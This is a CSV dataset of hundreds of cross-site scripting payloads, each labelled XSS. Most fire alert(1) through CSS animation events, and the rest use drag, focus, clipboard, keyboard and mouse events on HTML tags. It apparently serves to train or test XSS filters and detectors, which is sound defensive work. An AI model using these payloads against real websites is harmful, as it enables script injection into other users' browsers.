payload,attack
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationend=""alert(1)""></dl>",XSS
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationstart=""alert(1)""></dl>",XSS
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationend=""alert(1)""></dt>",XSS
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationstart=""alert(1)""></dt>",XSS
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationend=""alert(1)""></element>",XSS
"<style>@keyframes x{}</style><element style=""animation-name:x"" onanimationstart=""alert(1)""></element>",XSS
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",XSS
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationstart=""alert(1)""></em>",XSS
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",XSS
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationstart=""alert(1)""></embed>",XSS
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",XSS
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationstart=""alert(1)""></fieldset>",XSS
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationend=""alert(1)""></figcaption>",XSS
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationstart=""alert(1)""></figcaption>",XSS
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationend=""alert(1)""></figure>",XSS
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationstart=""alert(1)""></figure>",XSS
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationend=""alert(1)""></font>",XSS
"<style>@keyframes x{}</style><font style=""animation-name:x"" onanimationstart=""alert(1)""></font>",XSS
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationend=""alert(1)""></footer>",XSS
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationstart=""alert(1)""></footer>",XSS
"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationend=""alert(1)""></form>",XSS
"<style>@keyframes x{}</style><form style=""animation-name:x"" onanimationstart=""alert(1)""></form>",XSS
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationend=""alert(1)""></frame>",XSS
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>",XSS
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationend=""alert(1)""></frameset>",XSS
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>",XSS
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationend=""alert(1)""></h1>",XSS
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",XSS
"<style>@keyframes x{}</style><head style=""animation-name:x"" onanimationend=""alert(1)""></head>",XSS
"<style>@keyframes x{}</style><head style=""animation-name:x"" onanimationstart=""alert(1)""></head>",XSS
"<style>@keyframes x{}</style><header style=""animation-name:x"" onanimationend=""alert(1)""></header>",XSS
"<style>@keyframes x{}</style><header style=""animation-name:x"" onanimationstart=""alert(1)""></header>",XSS
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationend=""alert(1)""></hgroup>",XSS
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationstart=""alert(1)""></hgroup>",XSS
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationend=""alert(1)""></hr>",XSS
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationstart=""alert(1)""></hr>",XSS
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationend=""alert(1)""></html>",XSS
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationstart=""alert(1)""></html>",XSS
"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationend=""alert(1)""></i>",XSS
"<style>@keyframes x{}</style><i style=""animation-name:x"" onanimationstart=""alert(1)""></i>",XSS
"<style>@keyframes x{}</style><iframe style=""animation-name:x"" onanimationend=""alert(1)""></iframe>",XSS
"<style>@keyframes x{}</style><iframe style=""animation-name:x"" onanimationstart=""alert(1)""></iframe>",XSS
"<style>@keyframes x{}</style><image style=""animation-name:x"" onanimationend=""alert(1)""></image>",XSS
"<style>@keyframes x{}</style><image style=""animation-name:x"" onanimationstart=""alert(1)""></image>",XSS
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(1)""></img>",XSS
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationstart=""alert(1)""></img>",XSS
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationend=""alert(1)""></input>",XSS
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",XSS
"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationend=""alert(1)""></ins>",XSS
"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationstart=""alert(1)""></ins>",XSS
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationend=""alert(1)""></isindex>",XSS
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationstart=""alert(1)""></isindex>",XSS
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationend=""alert(1)""></kbd>",XSS
"<style>@keyframes x{}</style><kbd style=""animation-name:x"" onanimationstart=""alert(1)""></kbd>",XSS
"<style>@keyframes x{}</style><keygen style=""animation-name:x"" onanimationend=""alert(1)""></keygen>",XSS
"<style>@keyframes x{}</style><keygen style=""animation-name:x"" onanimationstart=""alert(1)""></keygen>",XSS
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationend=""alert(1)""></label>",XSS
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationstart=""alert(1)""></label>",XSS
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationend=""alert(1)""></legend>",XSS
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",XSS
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationend=""alert(1)""></li>",XSS
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationstart=""alert(1)""></li>",XSS
"<style>@keyframes x{}</style><link style=""animation-name:x"" onanimationend=""alert(1)""></link>",XSS
"<style>@keyframes x{}</style><link style=""animation-name:x"" onanimationstart=""alert(1)""></link>",XSS
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationend=""alert(1)""></listing>",XSS
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>",XSS
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationend=""alert(1)""></main>",XSS
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>",XSS
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationend=""alert(1)""></map>",XSS
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationstart=""alert(1)""></map>",XSS
"<style>@keyframes x{}</style><mark style=""animation-name:x"" onanimationend=""alert(1)""></mark>",XSS
"<style>@keyframes x{}</style><mark style=""animation-name:x"" onanimationstart=""alert(1)""></mark>",XSS
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onanimationend=""alert(1)""></marquee>",XSS
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onanimationstart=""alert(1)""></marquee>",XSS
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationend=""alert(1)""></menu>",XSS
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationstart=""alert(1)""></menu>",XSS
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationend=""alert(1)""></menuitem>",XSS
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationstart=""alert(1)""></menuitem>",XSS
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationend=""alert(1)""></meta>",XSS
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationstart=""alert(1)""></meta>",XSS
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""alert(1)""></meter>",XSS
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationstart=""alert(1)""></meter>",XSS
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationend=""alert(1)""></multicol>",XSS
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationstart=""alert(1)""></multicol>",XSS
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onanimationend=""alert(1)""></nav>",XSS
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onanimationstart=""alert(1)""></nav>",XSS
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationend=""alert(1)""></nextid>",XSS
"<style>@keyframes x{}</style><nextid style=""animation-name:x"" onanimationstart=""alert(1)""></nextid>",XSS
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationend=""alert(1)""></nobr>",XSS
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>",XSS
"<style>@keyframes x{}</style><noembed style=""animation-name:x"" onanimationend=""alert(1)""></noembed>",XSS
"<style>@keyframes x{}</style><noembed style=""animation-name:x"" onanimationstart=""alert(1)""></noembed>",XSS
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationend=""alert(1)""></noframes>",XSS
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationstart=""alert(1)""></noframes>",XSS
"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationend=""alert(1)""></noscript>",XSS
"<style>@keyframes x{}</style><noscript style=""animation-name:x"" onanimationstart=""alert(1)""></noscript>",XSS
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationend=""alert(1)""></object>",XSS
"<style>@keyframes x{}</style><object style=""animation-name:x"" onanimationstart=""alert(1)""></object>",XSS
"<style>@keyframes x{}</style><ol style=""animation-name:x"" onanimationend=""alert(1)""></ol>",XSS
"<style>@keyframes x{}</style><ol style=""animation-name:x"" onanimationstart=""alert(1)""></ol>",XSS
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationend=""alert(1)""></optgroup>",XSS
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(1)""></optgroup>",XSS
"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationend=""alert(1)""></option>",XSS
"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationstart=""alert(1)""></option>",XSS
"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationend=""alert(1)""></output>",XSS
"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationstart=""alert(1)""></output>",XSS
"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",XSS
"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationstart=""alert(1)""></p>",XSS
"<style>@keyframes x{}</style><param style=""animation-name:x"" onanimationend=""alert(1)""></param>",XSS
"<style>@keyframes x{}</style><param style=""animation-name:x"" onanimationstart=""alert(1)""></param>",XSS
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationend=""alert(1)""></picture>",XSS
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onanimationstart=""alert(1)""></picture>",XSS
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationend=""alert(1)""></plaintext>",XSS
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationstart=""alert(1)""></plaintext>",XSS
"<style>@keyframes x{}</style><pre style=""animation-name:x"" onanimationend=""alert(1)""></pre>",XSS
"<style>@keyframes x{}</style><pre style=""animation-name:x"" onanimationstart=""alert(1)""></pre>",XSS
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationend=""alert(1)""></progress>",XSS
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationstart=""alert(1)""></progress>",XSS
"<style>@keyframes x{}</style><q style=""animation-name:x"" onanimationend=""alert(1)""></q>",XSS
"<style>@keyframes x{}</style><q style=""animation-name:x"" onanimationstart=""alert(1)""></q>",XSS
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationend=""alert(1)""></rb>",XSS
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationstart=""alert(1)""></rb>",XSS
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationend=""alert(1)""></rp>",XSS
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationstart=""alert(1)""></rp>",XSS
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationend=""alert(1)""></rt>",XSS
"<style>@keyframes x{}</style><rt style=""animation-name:x"" onanimationstart=""alert(1)""></rt>",XSS
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationend=""alert(1)""></rtc>",XSS
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationstart=""alert(1)""></rtc>",XSS
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>",XSS
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationstart=""alert(1)""></ruby>",XSS
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",XSS
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationstart=""alert(1)""></s>",XSS
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationend=""alert(1)""></samp>",XSS
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationstart=""alert(1)""></samp>",XSS
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationend=""alert(1)""></script>",XSS
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationstart=""alert(1)""></script>",XSS
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationend=""alert(1)""></section>",XSS
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>",XSS
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationend=""alert(1)""></select>",XSS
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationstart=""alert(1)""></select>",XSS
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationend=""alert(1)""></shadow>",XSS
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationstart=""alert(1)""></shadow>",XSS
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationend=""alert(1)""></slot>",XSS
"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationstart=""alert(1)""></slot>",XSS
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationend=""alert(1)""></small>",XSS
"<style>@keyframes x{}</style><small style=""animation-name:x"" onanimationstart=""alert(1)""></small>",XSS
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationend=""alert(1)""></source>",XSS
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",XSS
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationend=""alert(1)""></spacer>",XSS
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationstart=""alert(1)""></spacer>",XSS
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationend=""alert(1)""></span>",XSS
"<style>@keyframes x{}</style><span style=""animation-name:x"" onanimationstart=""alert(1)""></span>",XSS
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationend=""alert(1)""></strike>",XSS
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationstart=""alert(1)""></strike>",XSS
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationend=""alert(1)""></strong>",XSS
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationstart=""alert(1)""></strong>",XSS
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationend=""alert(1)""></style>",XSS
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",XSS
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",XSS
"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationstart=""alert(1)""></sub>",XSS
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationend=""alert(1)""></summary>",XSS
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",XSS
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationend=""alert(1)""></sup>",XSS
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationstart=""alert(1)""></sup>",XSS
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationend=""alert(1)""></svg>",XSS
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",XSS
"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationend=""alert(1)""></table>",XSS
"<style>@keyframes x{}</style><table style=""animation-name:x"" onanimationstart=""alert(1)""></table>",XSS
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationend=""alert(1)""></tbody>",XSS
"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationstart=""alert(1)""></tbody>",XSS
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationend=""alert(1)""></td>",XSS
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(1)""></td>",XSS
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationend=""alert(1)""></template>",XSS
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",XSS
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationend=""alert(1)""></textarea>",XSS
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",XSS
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationend=""alert(1)""></tfoot>",XSS
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onanimationstart=""alert(1)""></tfoot>",XSS
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationend=""alert(1)""></th>",XSS
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationstart=""alert(1)""></th>",XSS
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationend=""alert(1)""></thead>",XSS
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationstart=""alert(1)""></thead>",XSS
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationend=""alert(1)""></time>",XSS
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationstart=""alert(1)""></time>",XSS
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",XSS
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationstart=""alert(1)""></title>",XSS
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationend=""alert(1)""></tr>",XSS
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationstart=""alert(1)""></tr>",XSS
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationend=""alert(1)""></track>",XSS
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>",XSS
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationend=""alert(1)""></tt>",XSS
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationstart=""alert(1)""></tt>",XSS
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationend=""alert(1)""></u>",XSS
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationstart=""alert(1)""></u>",XSS
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationend=""alert(1)""></ul>",XSS
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationstart=""alert(1)""></ul>",XSS
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationend=""alert(1)""></var>",XSS
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationstart=""alert(1)""></var>",XSS
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationend=""alert(1)""></video>",XSS
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",XSS
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationend=""alert(1)""></wbr>",XSS
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationstart=""alert(1)""></wbr>",XSS
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationend=""alert(1)""></xmp>",XSS
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationstart=""alert(1)""></xmp>",XSS
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>",XSS
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>",XSS
"<sub draggable=""true"" ondrag=""alert(1)"">test</sub>",XSS
"<sub draggable=""true"" ondragend=""alert(1)"">test</sub>",XSS
"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",XSS
"<sub draggable=""true"" ondragleave=""alert(1)"">test</sub>",XSS
"<sub draggable=""true"" ondragstart=""alert(1)"">test</sub>",XSS
<sub id=x tabindex=1 onactivate=alert(1)></sub>,XSS
<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>,XSS
<sub id=x tabindex=1 onbeforedeactivate=alert(1)></sub><input autofocus>,XSS
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,XSS
<sub id=x tabindex=1 onfocus=alert(1)></sub>,XSS
<sub id=x tabindex=1 onfocusin=alert(1)></sub>,XSS
"<sub onbeforecopy=""alert(1)"" contenteditable>test</sub>",XSS
"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",XSS
"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",XSS
<sub onblur=alert(1) tabindex=1 id=x></sub><input autofocus>,XSS
"<sub onclick=""alert(1)"">test</sub>",XSS
"<sub oncontextmenu=""alert(1)"">test</sub>",XSS
"<sub oncopy=""alert(1)"" contenteditable>test</sub>",XSS
"<sub oncut=""alert(1)"" contenteditable>test</sub>",XSS
"<sub ondblclick=""alert(1)"">test</sub>",XSS
<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>,XSS
"<sub onkeydown=""alert(1)"" contenteditable>test</sub>",XSS
"<sub onkeypress=""alert(1)"" contenteditable>test</sub>",XSS
"<sub onkeyup=""alert(1)"" contenteditable>test</sub>",XSS
"<sub onmousedown=""alert(1)"">test</sub>",XSS
"<sub onmouseenter=""alert(1)"">test</sub>",XSS
"<sub onmouseleave=""alert(1)"">test</sub>",XSS
"<sub onmousemove=""alert(1)"">test</sub>",XSS
"<sub onmouseout=""alert(1)"">test</sub>",XSS
"<sub onmouseover=""alert(1)"">test</sub>",XSS
"<sub onmouseup=""alert(1)"">test</sub>",XSS
"<sub onpaste=""alert(1)"" contenteditable>test</sub>",XSS
"<summary draggable=""true"" ondrag=""alert(1)"">test</summary>",XSS
"<summary draggable=""true"" ondragend=""alert(1)"">test</summary>",XSS
"<summary draggable=""true"" ondragenter=""alert(1)"">test</summary>",XSS
"<summary draggable=""true"" ondragleave=""alert(1)"">test</summary>",XSS
"<summary draggable=""true"" ondragstart=""alert(1)"">test</summary>",XSS
<summary id=x tabindex=1 onactivate=alert(1)></summary>,XSS
<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>,XSS
<summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>,XSS
<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>,XSS
<summary id=x tabindex=1 onfocus=alert(1)></summary>,XSS
<summary id=x tabindex=1 onfocusin=alert(1)></summary>,XSS
"<summary onbeforecopy=""alert(1)"" contenteditable>test</summary>",XSS
"<summary onbeforecut=""alert(1)"" contenteditable>test</summary>",XSS
"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",XSS
<summary onblur=alert(1) tabindex=1 id=x></summary><input autofocus>,XSS
"<summary onclick=""alert(1)"">test</summary>",XSS
"<summary oncontextmenu=""alert(1)"">test</summary>",XSS
"<summary oncopy=""alert(1)"" contenteditable>test</summary>",XSS
"<summary oncut=""alert(1)"" contenteditable>test</summary>",XSS
"<summary ondblclick=""alert(1)"">test</summary>",XSS
<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>,XSS
"<summary onkeydown=""alert(1)"" contenteditable>test</summary>",XSS
"<summary onkeypress=""alert(1)"" contenteditable>test</summary>",XSS
"<summary onkeyup=""alert(1)"" contenteditable>test</summary>",XSS
"<summary onmousedown=""alert(1)"">test</summary>",XSS
"<summary onmouseenter=""alert(1)"">test</summary>",XSS
"<summary onmouseleave=""alert(1)"">test</summary>",XSS
"<summary onmousemove=""alert(1)"">test</summary>",XSS
"<summary onmouseout=""alert(1)"">test</summary>",XSS
"<summary onmouseover=""alert(1)"">test</summary>",XSS
"<summary onmouseup=""alert(1)"">test</summary>",XSS
"<summary onpaste=""alert(1)"" contenteditable>test</summary>",XSS
"<sup draggable=""true"" ondrag=""alert(1)"">test</sup>",XSS
"<sup draggable=""true"" ondragend=""alert(1)"">test</sup>",XSS
"<sup draggable=""true"" ondragenter=""alert(1)"">test</sup>",XSS
"<sup draggable=""true"" ondragleave=""alert(1)"">test</sup>",XSS
"<sup draggable=""true"" ondragstart=""alert(1)"">test</sup>",XSS
<sup id=x tabindex=1 onactivate=alert(1)></sup>,XSS
<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>,XSS
<sup id=x tabindex=1 onbeforedeactivate=alert(1)></sup><input autofocus>,XSS
<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>,XSS
<sup id=x tabindex=1 onfocus=alert(1)></sup>,XSS
<sup id=x tabindex=1 onfocusin=alert(1)></sup>,XSS
"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",XSS
"<sup onbeforecut=""alert(1)"" contenteditable>test</sup>",XSS
"<sup onbeforepaste=""alert(1)"" contenteditable>test</sup>",XSS
<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>,XSS
"<sup onclick=""alert(1)"">test</sup>",XSS
"<sup oncontextmenu=""alert(1)"">test</sup>",XSS
"<sup oncopy=""alert(1)"" contenteditable>test</sup>",XSS
"<sup oncut=""alert(1)"" contenteditable>test</sup>",XSS
"<sup ondblclick=""alert(1)"">test</sup>",XSS
<sup onfocusout=alert(1) tabindex=1 id=x></sup><input autofocus>,XSS
"<sup onkeydown=""alert(1)"" contenteditable>test</sup>",XSS
"<sup onkeypress=""alert(1)"" contenteditable>test</sup>",XSS
"<sup onkeyup=""alert(1)"" contenteditable>test</sup>",XSS
"<sup onmousedown=""alert(1)"">test</sup>",XSS
"<sup onmouseenter=""alert(1)"">test</sup>",XSS
"<sup onmouseleave=""alert(1)"">test</sup>",XSS
"<sup onmousemove=""alert(1)"">test</sup>",XSS
"<sup onmouseout=""alert(1)"">test</sup>",XSS
"<sup onmouseover=""alert(1)"">test</sup>",XSS
"<sup onmouseup=""alert(1)"">test</sup>",XSS
"<sup onpaste=""alert(1)"" contenteditable>test</sup>",XSS
"<svg draggable=""true"" ondrag=""alert(1)"">test</svg>",XSS
"<svg draggable=""true"" ondragend=""alert(1)"">test</svg>",XSS
"<svg draggable=""true"" ondragenter=""alert(1)"">test</svg>",XSS
"<svg draggable=""true"" ondragleave=""alert(1)"">test</svg>",XSS
"<svg draggable=""true"" ondragstart=""alert(1)"">test</svg>",XSS
<svg id=x onfocus=alert(1)>,XSS
<svg id=x onfocusin=alert(1)>,XSS
<svg id=x tabindex=1 onactivate=alert(1)></svg>,XSS
<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>,XSS
<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>,XSS
<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>,XSS
"<svg onbeforecopy=""alert(1)"" contenteditable>test</svg>",XSS
